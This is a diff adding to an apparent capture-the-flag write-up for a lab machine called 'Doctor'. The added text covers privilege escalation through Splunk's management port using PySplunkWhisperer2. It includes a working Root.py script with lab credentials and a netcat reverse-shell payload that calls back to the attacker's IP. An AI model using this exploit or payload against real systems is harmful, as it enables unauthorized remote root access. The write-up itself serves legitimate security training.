@@ -184,11 +184,47 @@ body {
 		
 	<h1> PRIVESC </h1>													<br/> <br/> <br/>
 	There is a backup file present in the apache logs, which contained a password						<br/> <br/>
-	<img src="images/doctor/low-priv-pass.PNG" alt="user script" class="inline"/>   					<br/> <br/> <br/>
+	<img src="images/doctor/low-priv-pass.PNG" alt="backup file" class="inline"/>   					<br/> <br/> <br/>
 		
 	This allowed us to pivot to user shaun grab the user.txt flag								<br/> <br/>
 	<img src="images/doctor/user-txt.PNG" alt="user.txt" class="inline"/>   						<br/> <br/> <br/>
+		
+	After attaining user, I started checking out the splunk install on 8089, to see if we could trigger command		<br/>
+	injection somehow. Turns out there are several tools already built for this, I opted to use PySplunkWhisperer2 		<br/>
+	which you can <a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2"> checkout here </a>	<br/> <br/>
+		
+	The script lets you run bash commands. After some trial and error I was eventually able to get the openBSD netcat one liner to work		<br/> <br/>
+	<img src="images/doctor/nc-openbsd-rev.PNG" alt="nc openbsd one liner" class="inline"/>   							<br/> <br/><br/> 
+		
+	
+	
+	<h1> Root.py </h1>
+	<pre>
+	#!/usr/bin/python3
 
+	from pwn import *
+	import time,os
+
+	my_ip = '10.10.14.29'
+	my_port = '8001'
+	pysplunk = '/opt/SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py'
+	
+
+	l = listen(my_port)
+	time.sleep(0.5)
+	exploit = ''
+	exploit += 'python ' + pysplunk
+	exploit += ' --host 10.10.10.209 ' 
+	exploit += ' --lhost ' + my_ip + ' '
+	exploit += ' --username shaun --password Guitar123 '
+	exploit += ' --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ' + my_ip + " " + my_port 
+	exploit += ' >/tmp/f"  > /dev/null'
+ 
+	os.system(exploit)
+	l.interactive()
+	</pre>
+		
+	<img src="images/doctor/root2.PNG" alt="user script" class="inline"/>   					<br/> <br/> <br/>
         </p>
 </div><!-- /.blurb -->
 <div class="blurb">
